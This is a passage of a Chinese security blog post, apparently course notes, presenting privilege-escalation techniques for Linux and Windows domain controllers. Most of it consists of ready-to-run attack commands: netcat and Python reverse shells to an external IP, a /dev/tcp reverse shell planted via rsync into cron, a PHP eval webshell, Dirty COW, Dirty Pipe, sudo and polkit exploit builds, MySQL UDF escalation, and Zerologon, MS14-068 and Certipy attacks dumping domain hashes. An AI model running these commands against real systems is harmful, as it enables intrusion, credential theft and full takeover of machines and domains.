Import-Module .\PowerUp.ps1 && Invoke-All Checks
sc config "test" binpath="C:\Program.exe"
sc start test

### 9.4 linux提权

#### 9.4.1 辅助项目提权

##### （ 1 ）项目地址

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/liamg/traitor</span><br><span class="line">https://github.com/AlessandroZ/BeRoot</span><br><span class="line">https://github.com/rebootuser/LinEnum</span><br><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line">https://github.com/sleventyeleven/linuxprivchecker</span><br><span class="line">https://github.com/jondonas/linux-exploit-suggester- 2</span><br><span class="line">Linux：https://gtfobins.github.io/</span><br><span class="line">Windows：https://lolbas-project.github.io/</span><br></pre></td></tr></table></figure>
（ 2 ）项目大致分类

一个综合类探针 traitor，一个自动化提权 BeRoot(gtfobins&lolbas)，两个信
息收集LinEnum linuxprivchecker，两个漏洞探针linux-exploit-suggester&2


#### 9.4.2 suid提权

chmod u+s给予普通用户可以借助root权限执行某些命令，chmod u-s可以
删除suid。

（ 1 ）手工命令探针安全

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm - 4000 - print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm - 4000 - exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
（ 2 ）脚本项目探针安全

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinEnum.sh traitor linuxprivchecker</span><br></pre></td></tr></table></figure>
（ 3 ）利用NC反弹

find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;
netcat xx.xx.xx.xx 5555
nc x.x.x.x 4444 | /bin/bash | nc x.x.x.x 5555#从 4444 端口获取到命令，bash 运
行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执
行监听。

（ 4 ）利用Python反弹：

find xiaodi -exec python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.co
nnect(("47.94.236.117",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;
nc -lvp 777 7

#### 9.4.3 脏牛脏管道提权

##### （ 1 ）简单介绍

搜寻exp 直接提权。连接服务器，获取可利用漏洞，下载或上传EXP，编
译EXP，给权限执行。
探针项目：BeRoot linux-exploit-suggester linux-exploit-suggester2
如gcc 45010.c -o exp && sh exp

（ 2 ）linux脏牛dcow

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内核提权整个过程：（linux-exploit-suggester获取信息）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过msf拿到web权限，上传脏牛漏洞利用脚本exp</span><br><span class="line">upload /root/dcow.cpp /tmp/dcow.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">./dcow &amp;&amp; su root</span><br></pre></td></tr></table></figure>
（ 3 ）Linux-DirtyPipe提权 (CVE- 2022 - 0847)

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line">gcc -o dirtypipez dirtypipez.c</span><br><span class="line">./dirtypipez /usr/bin/su #任何具体suid权限的文件均可</span><br></pre></td></tr></table></figure>
#### 9.4.4 环境变量配合suid

探针：find / -user root -perm - 4000 - print 2>/dev/null
gcc demo.c -o shell && chmod u+s shell
root用户可执行文件进行编译，保证文件的正常授权运行，给予 ROOT权
限执行，普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直
接让其执行指定程序获取权限
cp /bin/bash /tmp/ps && export PATH=/tmp:$PATH && ./shell

#### 9.4.5 定时任务配合tar

利用计划任务的备份功能tar命令的参数利用,在计划任务中定时执行test.sh
命令，执行之后会生成bash的s文件，可利用此进行提权；也可以利用直接将
反弹shell的代码写入test.sh，只需监听端口，定时任务触发后就会接收到反弹
shell。
echo "" > "--checkpoint-action=exec=sh test.sh";echo "" > --checkpoint=1;echo
'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > test.sh;chmod +x test.sh

#### 9.4.6 权限配置不当

##### 利用不安全的权限分配操作导致的定时文件覆盖，导致某些文件可以被普

##### 通用户修改，且此文件会定时执行。

##### 所有者/组/其他：读取 4 写入 2 执行 1

##### 755 表示所有者读取写入执行，组和其他用户只有读取和执行

##### 644 表示所有者写入和执行，组和其他用户只有执行


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">444 r--r--r-- 600 rw------- 644 rw-r--r-- 666 rw-rw-rw-</span><br><span class="line">700 rwx------ 744 rwxr--r-- 755 rwxr-xr-x 777 rwxrwxrwx</span><br></pre></td></tr></table></figure>
#### 9.4.7 linux下的mysql提权

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://www.vulnhub.com/entry/raven-2,269/</span><br></pre></td></tr></table></figure>
（ 1 ）webshell获取

探针IP及端口：nmap 192.168.46.0/24
利用phpmailer漏洞进行修改并反弹：python D:/Myproject/40974.py
写入后门利用菜刀连接方便操作：echo '<?php eval($_POST[x]);?>' >1.php
上传信息收集脚本进行提权信息收集：./LinEnum.sh
翻阅数据库配置文件获取root密码

（ 2 ）mysql

利用Mysql提权 searchsploit，下载mysql udf kali poc进行编译：
wget https://www.exploit-db.com/download/1518 - O raptor_udf.c
gcc -g -c raptor_udf.c
gcc -g -shared -o raptor_udf.so 1518.so -lc
上传或下载 1518 到目标服务器：
wget https://xx.xx.xx.xx/1518.so

（ 3 ）mysql udf提权

进入数据库进行UDF导出：
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
创建do_system函数调用：
create function do_system returns integer soname '1518.so';
select do_system('chmod u+s /usr/bin/find');
配合使用find调用执行：
touch xiaodi
find xiaodi –exec "whoami" \;
find xiaodi –exec "/bin/sh" \;
id


##### （ 4 ）注：无法外连走隧道-

GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY
'R@v3nSecurity' WITH GRANT OPTION;
flush privileges;
允许 root 外连若还是无法连接，则可能是防火墙的阻止，可利用 webshell
工具将端口穿透出来。

#### 9.4.8 mdut数据库自动化提权

MDUT 2.0 数据库利用工具：https://github.com/SafeGroceryStore/MDUT
java8 -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar
综合漏洞利用(包含各数据库) https://github.com/Liqunkit/LiqunKit_ LiqunKit
mssql利用工具：https://github.com/uknowsec/SharpSQLTools SharpSQLTools
通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向
移动 https://github.com/blackarrowsec/mssqlproxy mssqlproxy
ODAT：Oracle 数据库攻击工具 https://github.com/quentinhardy/odat ODAT

#### 9.4.9 rsync未授权及反弹shell

Rsync是linux下一款数据备份工具，默认开启 873 端口，借助Linux默认
计划任务调用/etc/cron.hourly，利用rsync连接覆盖。
创建一个nc文件，内容如下：
#!/bin/bash
/bin/bash -i >& /dev/tcp/47.94.236.117/3333 0>&i
赋予执行权限：chmod +x nc
上传文件覆盖定时任务目录下：
rsync -av nc rsync://47.94.236.117:873/src/etc/cron.hourly
下载文件：rsync -av rsync://47.94.236.117:873/src/etc/passwd ./
进行nc 监听相应的端口：nc -lvnp 3333

#### 9.4.10 docker组挂载

普通用户在 docker 组，利用 docker 服务启动镜像挂载目录，从而来访问
root目录、etc目录等敏感文件来进行权限提升。
创建用户归类目录，添加到docker组


useradd -d /home/test -m test
passwd test
usermod -G docker test
newgrp docker
从Docker上面下载alpine镜像，然后运行，-v将容器外部的目录/root挂载
到容器内部/mnt，使用-it参数进入容器shell。
docker run -v /root:/mnt -it alpine

#### 9.4.11 sudo提权

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo: 版本在1.8.2 - 1.8.31p2或者 1.9.0 - 1.9.5p1</span><br><span class="line">git clone https://github.com/blasty/CVE- 2021 - 3156.git</span><br><span class="line">cd CVE- 2021 - 3156</span><br><span class="line">make &amp;&amp; chmod a+x sudo-hax-me-a-sandwich</span><br><span class="line">./sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure>
#### 9.4.12 polkit漏洞

漏洞影响 2009 年 5 月至今的所有polkit版本，由于polkit是系统预装工具，
所有存在polkit的linux系统均受影响，只要存在polkit且没有打补丁就可以提
权。
通过dpkg -l policykit- 1 或者 rpm -q policykit- 1 来判断是否存在
git clone https://github.com/berdav/CVE- 2021 - 4034.git
cd CVE- 2021 - 4034/
make && ./cve- 2021 - 4034

### 9.5 域控提权(1)

##### 9 .5.1 CVE- 2014 - 6324

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://www.cnblogs.com/feizianquan/p/11760564.html</span><br></pre></td></tr></table></figure>
（ 1 ）前提条件：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要域用户账号密码 + 一台主机的管理员权限 +</span><br><span class="line">域控没有打MS14- 068 的补丁(KB3011780)</span><br></pre></td></tr></table></figure>
（ 2 ）工具下载


Ms14-068.exe:
https://github.com/abatchy17/WindowsExploits/tree/master/MS14- 068
PSexec:
https://github.com/crupper/Forensics-Tool-
Wiki/blob/master/windowsTools/PsExec64.exe
mimikatz:
https://github.com/gentilkiwi/mimikatz/releases

（ 3 ）漏洞利用

a. 如果当前用户为域用户
whoami /user 得到域成员用户名和sid号
net time /domain 指定要同步时钟的域，可以查看域名称
b. 如果当前用户是普通用户，利用管理员身份启动mimikatz
利用下列命令获取域用户sid和域控主机名
输入privilege::debug 权限提升，在输入log 会在当前文件夹下生成后面命
令执行的结果方便我们查找数据，最后输入sekurlsa::logonPasswords 抓取密码
c. 利用ms14-068.exe 工具生成伪造的kerberos协议认证证书
ms14-068.exe -u 域成员名@域名 - p 域成员密码 - s 域成员sid -d 域控制器
地址
ms14-068.exe -u mary@god.org -p admin!@#45 -s S- 1 - 5 - 21 - 1218902331 -
2157346161 - 1782232778 - 1124 - d OWA2010CN-God.god.org
d. 利用mimikatz.exe将证书写入，从而提升为域管理员
kerberos::purge 清除当前会话
kerberos::ptc "TGT_test02@test.lab.ccache" 导入由ms14-068.exe生成的证书
名字
kerberos::list 查看与域控是否建立了联系
e. 连接域控，获取域控的shell
dir \\OWA2010CN-God.god.org\C$ 测试连接是否成功
psexec \\OWA2010CN-God.god.org cmd 使用PsExec.exe以管理员权限运行
连接域控

##### 9 .5.2 CVE- 2020 - 1472

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://cloud.tencent.com/developer/article/1837483</span><br></pre></td></tr></table></figure>
（ 1 ）前提条件：


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE- 2020 - 1472 是继MS17010之后好用的NetLogon特权域控提权漏洞，</span><br><span class="line">只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞.</span><br><span class="line">该漏洞不要求当前计算机在域内,也不要求当前计算机操作系统为Windows.</span><br></pre></td></tr></table></figure>
（ 2 ）工具下载

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下载poc：https://github.com/SecuraBV/CVE- 2020 - 1472</span><br><span class="line">下载exp：https://github.com/dirkjanm/CVE- 2020 - 1472</span><br></pre></td></tr></table></figure>
（ 3 ）漏洞利用

a. 获取目标计算机名，进行漏洞检测
获取目标计算机名：nbtscan -v -h 192.168.3.21
验证漏洞是否存在：python3 zerologon_tester.py OWA2010CN-GOD
192.168.3.21
b. 重置DC密码，获取hash
重置 DC 密码：python3 cve- 2020 - 1472 - exploit.py OWA2010CN-GOD
192.168.3.21
使用impacket包中的secretsdum.py来获取相关的HASH:
python3 secretsdump.py god.org/OWA2010CN-GOD\$@192.168.3.21 -no-pass
c. 通过wmicexec.py使用hash获取DC的shell
获取HASH后，可以利用wmiexec.py登录，从而获取一个shell
python wmiexec.py -hashes <HASH> DOMAIN/DOMAIN_USER@DC_ipaddr
wmi连接反弹：python3 wmiexec.py god/administrator@192.168.3.21 -hashes
aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7

##### 9 .5.3 CVE- 2021 - 42287

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考地址：https://new.qq.com/rain/a/20211217a0brmf00</span><br></pre></td></tr></table></figure>
（ 1 ）前提条件：

一个普通域成员帐户 + 域用户有创建机器用户的权限（一般默认权限）+
DC未打补丁KB5008380或KB5008602。

（ 2 ）工具下载

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sam_the_admin.py: https://github.com/WazeHell/sam-the-admin</span><br></pre></td></tr></table></figure>
（ 3 ）漏洞利用

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从域外环境已知域内一个普通用户密码直接拿DC shell或者域内所有hash</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sam_the_admin.py god/&#x27;mary:admin!@#45&#x27; -dc-ip 192.168.3.21 -shell</span><br></pre></td></tr></table></figure>
##### 9 .5.4 CVE- 2022 - 26923

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://www.freebuf.com/vuls/335471.html</span><br></pre></td></tr></table></figure>
（ 1 ）前提条件：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个域内普通账号 + 域内存在证书服务器</span><br></pre></td></tr></table></figure>
（ 2 ）工具下载

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ly4k/Certipy</span><br><span class="line">https://github.com/CravateRouge/bloodyAD</span><br><span class="line">https://github.com/SecureAuthCorp/impacket</span><br><span class="line">https://github.com/dirkjanm/PKINITtools</span><br></pre></td></tr></table></figure>
（ 3 ）漏洞利用

a. 首先需要获取域控服务器，域证书服务器的一些基本信息
在受控的主机上执行powershell命令Get-ChildItem Cert:\LocalMachine\Root\
得到域证书服务器地址fenghuotai-DC-CA，
域控服务器地址fenghuotai.local，域控计算机名为dc
b. 设置攻击机的DNS服务器地址为域控DNS服务器地址
192.168.1.15 fenghuotai.local dc.fenghuotai.local fenghuotai-DC-CA
c. 使用掌握的域内普通用户账号申请证书并验证登录，测试复现环境是否异常
申请证书：certipy req 'fenghuotai.local/testcve:1qaz3edc.@dc.fenghuotai.local'

- ca fenghuotai-DC-CA -template User
    可能会遇到NETBIOS超时现象，重新执行一次申请证书命令即可
    验证该证书，获取其NT hash：certipy auth -pfx testcve.pfx
d. 新建账号pwnmachine，配置DNShostname，并申请域控dc$的证书
    新建一台名为pwnmachine，密码为CVEPassword1234*的机器账号：
    python bloodyAD.py -d fenghuotai.local -u testcve -p '1qaz3edc.' --host
192.168.220.160 addComputer pwnmachine 'CVEPassword1234*'，
    设置其dNSHostName 属性为域控服务器属性：
    python bloodyAD.py -d fenghuotai.local -u testcve -p '1qaz3edc.' --host
1 92.168.220.160 setAttribute 'CN=pwnmachine,CN=Computers,DC=fenghuotai,
DC=local' dNSHostName '["dc.fenghuotai.local"]'
    申请新建的机器账号pwnmachine$的证书，其实申请到的是域控dc$的证书：


certipy req 'fenghuotai.local/pwnmachine$:CVEPassword1234*@192.168.220.
160' -template Machine -dc-ip 192.168.220.160 -ca fenghuotai-DC-CA
进行登录验证，获取其NT hash:
certipy auth -pfx ./dc.pfx -dc-ip 192.168.220.160
e. 获取域内所有账户hash，通过hash获取shell
使用impacket工具examples目录下的secretsdump.py脚本：
python3 secretsdump.py 'fenghuotai.local/dc$@dc.fenghuotai.local' -hashes :xxx
通过hash获取到域控的shell
python3 wmiexec.py fenghuotai.local/administrator@192.168.1.15 -hashes
aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd
还可以使用PKINITtools工具，获取域控最高权限shell

</HASH></win>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-07-04 01:50:54" itemprop="dateModified" datetime="2023-07-04T01:50:54+08:00">2023-07-04</time>
  </span>
  <span id="2023/07/04/SAFE/9 权限提升/" class="item leancloud_visitors" data-flag-title="" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="">http://n1h1l157.github.io/2023/07/04/SAFE/9 权限提升/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;PJpRugYe4fBbxhD.jpg" title="未命名">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>未命名</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;OqCyTJE92HvirRI.jpg" title="未命名">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>未命名</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#91-webshell%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text"> 9.1 webshell 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#911-phpmyadmin%E7%AA%81%E7%A0%B4"><span class="toc-number">1.1.</span> <span class="toc-text"> 9.1.1 phpmyadmin 突破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#912-win-web%E6%8F%90%E6%9D%83%E8%87%B3%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.2.</span> <span class="toc-text"> 9.1.2 win web 提权至系统</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.1.</span> <span class="toc-text"> （ 1 ）信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC-%E6%BC%8F%E6%B4%9E%E8%A1%A5%E4%B8%81-%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0-%E6%9D%80%E8%BD%AF%E9%98%B2%E6%8A%A4-%E7%BD%91%E7%BB%9C%E6%83%85%E5%86%B5-%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90%E7%AD%89"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 操作系统版本、漏洞补丁、系统位数、杀软防护、网络情况、当前权限等</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%B7%A5%E5%85%B7%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.3.</span> <span class="toc-text"> （ 3 ）工具辅助提权</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#913-msf%E5%85%A8%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text"> 9.1.3 MSF 全自动提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text"> （ 1 ）生成反弹后门</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#914-cs%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text"> 9.1.4 cs 半自动化提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E9%85%8D%E7%BD%AE%E5%90%AF%E5%8A%A8"><span class="toc-number">1.4.1.</span> <span class="toc-text"> （ 1 ）配置启动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%A4%E8%80%85%E9%83%BD%E5%85%B3%E6%8E%89%E7%AC%AC%E4%B8%89%E8%80%85%E7%9A%84%E7%AB%AF%E5%8F%A3%E7%BB%9F%E7%BB%9F%E5%BC%80%E6%94%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 两者都关掉，第三者的端口统统开放</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#92-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text"> 9.2 数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#921-mysql%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> 9.2.1 mysql 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E8%A6%81%E6%AF%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E6%9B%B4%E5%AE%B9%E6%98%93%E5%BE%97%E5%88%B0%E6%9D%83%E9%99%90"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 用系统漏洞提权要比数据库漏洞提权更容易得到权限。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#922-mssql%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text"> 9.2.2 mssql 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E7%94%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 启用：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#923-oracle%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text"> 9.2.3 oracle 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#924-postgresql%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text"> 9.2.4 postgresql 提权</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt=".N1h1l157"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">.N1h1l157</p>
  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">166</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">5</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">40</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
  </li>

        
  <li class="item">
    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
  </li>

        
  <li class="item">
    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
